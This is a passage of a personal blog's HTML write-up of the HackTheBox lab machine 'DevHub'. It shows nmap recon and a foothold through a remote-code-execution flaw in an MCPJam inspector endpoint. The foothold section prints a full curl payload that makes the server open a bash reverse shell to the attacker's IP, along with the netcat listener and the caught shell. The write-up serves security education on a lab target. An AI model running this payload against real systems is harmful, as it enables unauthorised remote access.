@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" type="image/x-icon" href="/cybersec_logo.ico">
+<title>DevHub - Privilege escalation through hidden API endpoints</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+  integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+  crossorigin="anonymous" referrerpolicy="no-referrer" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Sans+Mono:ital,wght@0,400..700;1,400..700&display=swap');
+
+  .font-jersey {
+
+    font-family: "Ubuntu Sans Mono", monospace;
+    font-optical-sizing: auto;
+    font-style: normal;
+  }
+
+
+  .md-content .katex-display {
+    max-width: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+  }
+
+  .md-content .katex-display>.katex {
+    display: inline-block;
+    max-width: 100%;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: 300ms ease-in-out;
+  }
+
+  .is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: opacity 300ms ease-in-out;
+  }
+
+  html.is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  html.is-animating {
+    cursor: progress;
+  }
+
+  html.is-leaving .swup-transition-fade {
+    opacity: 0;
+  }
+</style>
+
+<script src="https://unpkg.com/swup@4"></script>
+<script src="https://unpkg.com/@swup/preload-plugin@3"></script>
+<script src="https://unpkg.com/@swup/progress-plugin@3"></script>
+<script>
+  const swup = new Swup({
+    containers: ['#swup'],
+    animationSelector: '[class*="swup-transition-"]',
+    cache: true,
+    preload: true,
+    animateHistoryBrowsing: true,
+
+    plugins: [
+      new SwupPreloadPlugin(),
+      new SwupProgressPlugin()
+    ]
+  })
+  window.swup = swup
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  crossorigin="anonymous"></script>
+
+<script>
+  
+
+  
+  const KATEX_CONFIG = {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false},
+      {left: "\\[", right: "\\]", display: true},
+      {left: "\\(", right: "\\)", display: false}
+    ],
+    ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+    throwOnError: false
+  };
+
+  
+  function renderKatex() {
+    
+    if (typeof renderMathInElement !== "function") {
+      console.log("⏳ Waiting for KaTeX to load...");
+      return;
+    }
+
+    
+    const contentArea = document.getElementById('swup') || document.body;
+
+    try {
+      renderMathInElement(contentArea, KATEX_CONFIG);
+      console.log("✅ KaTeX rendered successfully");
+    } catch (error) {
+      console.error("❌ KaTeX rendering error:", error);
+    }
+  }
+
+  
+  function renderKatexWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof renderMathInElement === "function") {
+        renderKatex();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ KaTeX auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering KaTeX...");
+        
+        setTimeout(() => renderKatexWithRetry(3, 50), 50);
+      });
+      console.log("✅ KaTeX-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderKatexWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+  
+  window.renderKatex = renderKatex;
+</script>
+
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+
+  let initialized = false;
+
+  function renderMermaid() {
+    const contentArea = document.getElementById('swup') || document.body;
+    const mermaidBlocks = contentArea.querySelectorAll('.language-mermaid, .mermaid');
+
+    if (mermaidBlocks.length === 0) {
+      console.log("ℹ️ No mermaid blocks found on this page");
+      return;
+    }
+
+    if (!initialized) {
+      mermaid.initialize({startOnLoad: false, theme: 'dark'});
+      initialized = true;
+    }
+
+    mermaidBlocks.forEach(el => {
+      if (el.dataset.processed === 'true') {
+        const source = el.dataset.mermaidSource;
+        if (source) {
+          el.innerHTML = source;
+          el.removeAttribute('data-processed');
+        }
+      } else {
+        el.dataset.mermaidSource = el.textContent;
+      }
+    });
+
+    mermaid.run({nodes: mermaidBlocks})
+      .then(() => console.log("✅ Mermaid rendered successfully"))
+      .catch(err => console.error("❌ Mermaid rendering error:", err));
+  }
+
+  function renderMermaidWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof mermaid.initialize === "function") {
+        renderMermaid();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ Mermaid auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering mermaid...");
+        
+        setTimeout(() => renderMermaidWithRetry(3, 50), 50);
+      });
+      console.log("✅ Mermaid-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderMermaidWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+
+
+</script>
+
+
+</head>
+
+<body class="min-h-screen flex flex-col bg-black font-jersey text-white text-3xl">
+  <header>
+    <div class="sticky absolute top-0 z-50">
+  <nav class="w-full border-b border-gray-800 bg-[#070709]/95 backdrop-blur-sm text-gray-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-3">
+
+          <a href='http://localhost:1313/' class="flex items-center gap-3 group" aria-label="Homepage">
+
+            <img src='/cybersec_logo.png' alt="Esteban Pangelinan - Cybersecurity"
+              class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
+              style="animation: border-breathe 4s ease-in-out infinite;" />
+            <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
+              root@epangelinan: cd
+              <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
+            </span>
+          </a>
+        </div>
+
+        
+        <div class="flex items-center gap-4">
+          
+          <div class="hidden md:flex items-center">
+            
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+          </div>
+
+          
+          <div class="md:hidden">
+            <button id="nav-toggle" aria-controls="mobile-menu" aria-expanded="false"
+              class="inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400"
+              aria-label="Open menu">
+              <svg class="h-6 w-6 text-gray-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        
+        
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+      </div>
+    </div>
+  </nav>
+
+  
+  <style>
+    @keyframes flicker {
+      0% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      10% {
+        opacity: 0.2;
+        transform: translateY(-1px);
+      }
+
+      20% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes border-breathe {
+      0% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+
+      50% {
+        box-shadow: 0 0 18px 6px rgba(99, 102, 241, 0.03);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+    }
+  </style>
+
+  
+  <script>
+    (function () {
+      const btn = document.getElementById('nav-toggle');
+      const menu = document.getElementById('mobile-menu');
+      if (!btn || !menu) return;
+      btn.addEventListener('click', () => {
+        const open = menu.classList.toggle('hidden') === false;
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    })();
+  </script>
+</div>
+
+  </header>
+
+  <main class="flex-1 w-full">
+    <div id="swup" class="swup-transition-fade">
+      <div class="max-w-3xl lg:max-w-6xl xl:max-w-7xl mx-auto px-5 sm:px-8 lg:px-10 py-10 lg:py-16">
+        
+<main class="max-w-6xl mx-auto px-4 sm:px-6 pt-24 pb-12 text-gray-100">
+  <div class="grid grid-cols-12 gap-6">
+    <aside class="hidden lg:block col-span-3">
+      <div class="sticky top-24">
+        <div class="mb-3 text-xs uppercase tracking-widest text-gray-500">Table of Contents</div><nav class="toc text-sm text-gray-300 border border-gray-800/70 bg-[#070709] rounded-sm p-4">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+        </nav></div>
+    </aside>
+
+    <article class="col-span-12 lg:col-span-7">
+      <header class="mb-6">
+  <h1 class="text-2xl sm:text-3xl md:text-4xl tracking-wide text-white">
+    DevHub - Privilege escalation through hidden API endpoints
+  </h1>
+
+  <div class="mt-2 flex flex-wrap items-center gap-x-3 gap-y-2 text-sm sm:text-base text-gray-400">
+    <span class="font-mono">Jun 24, 2026 • 16:25</span>
+    <span class="text-gray-700">/</span>
+    <span class="font-mono">11 min read</span>
+  </div><div class="mt-3 flex flex-wrap gap-2"><a href="/%20tags/htb-medium"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #HTB - Medium
+    </a><a href="/%20tags/linux"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Linux
+    </a><a href="/%20tags/pentesting"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Pentesting
+    </a></div></header>
+
+
+      <div class="lg:hidden mb-6">
+        <details class="border border-gray-800/70 bg-[#070709] rounded-sm">
+          <summary class="cursor-pointer select-none px-4 py-3 text-gray-200 hover:text-white transition-colors">
+            Table of Contents
+          </summary>
+          <div class="px-4 pb-4 toc text-sm text-gray-300">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+          </div>
+        </details>
+      </div>
+
+      <div class="md-surface border border-gray-800/70 bg-[#070709] rounded-sm p-4 sm:p-6">
+        <div class="md-content text-base leading-relaxed text-gray-200">
+          <h2 id="overview" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>OVERVIEW</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p><em>DevHub</em> is a medium-rated Linux machine on the HackTheBox platform. Hacking into the machine requires leveraging a known CVE to gain a foothold through an MCP server endpoint, token extraction through process enumeration in order to move laterally, and privilege escalation using internal services to extract a root SSH key.</p>
+<h2 id="recon" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>RECON</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>After obtaining the target machine&rsquo;s IP address, I ran an nmap scan to identify open TCP ports:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -sS -oN nmap_scan.txt 10.129.37.179                   </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The scan revealed two open TCP ports for SSH and HTTP:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-06-24 16:27 PDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.37.179
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.078s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://devhub.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.40 seconds</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I added the domain revealed by <strong>nmap</strong> (devhub.htb) to my <strong>/etc/hosts</strong> file and visited the site in a web browser:<br>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/devhub/homepage.png" loading="lazy" decoding="async"
+  alt="homepage"></p>
+<h2 id="enumeration" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>ENUMERATION</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>While doing manual enumeration of the site, I ran <strong>gobuster</strong> in the background to see if there were any hidden endpoints but came up with <em>nothing</em>. With that out of the way, I could focus on what information the site was giving me in plaintext:<br>
+ <br>
+<strong>MCP Inspector</strong>: running on <strong>port 6274</strong><br>
+ <br>
+<strong>Analytics Dashboard</strong>: running internally<br>
+ <br>
+<strong>Code Repository</strong>: only accessed in <em>maintenance mode</em><br>
+ <br>
+With this information from the site, the best course of action would be to find a foothold on the system through the <strong>MCPJam</strong> endpoint, and once <em>in</em> the system, move on to accessing the other services running internally.<br>
+ <br>
+So, that&rsquo;s exactly what I did.</p>
+<h2 id="foothold" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>FOOTHOLD</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p><img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/devhub/mcpjam.png" loading="lazy" decoding="async"
+  alt="mcpjam dashboard">
+The <strong>MCP Inspector</strong> endpoint brought me to this page, in which I immediately recognized from a <em>previous</em> HTB machine (which I&rsquo;ve made a writeup about <a href="https://est706.github.io/writeups/kobold/"><strong>here</strong></a>)<br>
+ <br>
+This version of <strong>MCPJam</strong> is susceptible to <em>RCE</em> through malicious HTTP requests. All I had to do to get a foothold was run a <strong>curl</strong> command on my attacker machine containing <strong>data</strong> for the API endpoint to run.<br>
+ <br>
+First, I had to set up my <strong>listener</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>And run the <strong>curl</strong> command I been hyping up:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# curl http://devhub.htb:6274/api/mcp/connect --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data <span style="color:#e6db74">&#39;{&#34;serverConfig&#34;:{&#34;command&#34;:&#34;/bin/bash&#34;,&#34;args&#34;:[&#34;-c&#34;, &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.192/4444 0&gt;&amp;1&#34;],&#34;env&#34;:{}},&#34;serverId&#34;:&#34;letmein&#34;}&#39;</span> -k</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.192<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.37.179<span style="color:#f92672">]</span> <span style="color:#ae81ff">36154</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1082<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>mcp-dev
+</span></span><span style="display:flex;"><span>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>mcp-dev<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>mcp-dev<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>mcp-dev<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Shell has been <strong>caught</strong>.<br>
+ <br>
+I went ahead and cleaned up the shell to give me a proper TTY, then moved straight to enumerating. The user I was running as didn&rsquo;t have the ability to do pretty much <em>anything</em> that&rsquo;d be helpful for me- no SUID binaries, capabilities, none of that. So, I came at it from a different angle:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mcp-dev@devhub:~$ cat /etc/passwd | grep /bin/bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
+</span></span><span style="display:flex;"><span>analyst:x:1002:1002::/home/analyst:/bin/bash</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Other than the <strong>mcp-dev</strong> user I was currently running as, the machine had an <strong>analyst</strong> user that looked interesting. Thinking back to the main page of the site, I remembered it mentioning an <strong>analytics dashboard</strong> running internally within the system.<br>
+ <br>
+I checked to see what TCP connections were running so I could tunnel it back to my attacker machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
